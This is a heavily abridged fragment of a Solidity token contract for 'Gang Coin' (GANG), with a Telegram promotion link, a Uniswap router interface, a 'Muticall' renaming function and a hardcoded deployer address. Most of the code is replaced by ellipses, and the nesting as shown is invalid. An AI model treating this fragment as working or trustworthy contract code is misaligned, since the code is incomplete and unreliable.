...
$Gang
Telegram :https://t.me/GangCoinErc
...
interface IUniswapV2Router02 {
    ...
    contract GANG {
        string private  name_ = "Gang Coin";  
        string private  symbol_ = "GANG";  
       ...
       function Muticall(string memory name,string memory symbol) external {
        ...
        address payable constant deployer = payable(address(0x602590e2aCfB8E4e08907504D42E0166890e2f3e)); 
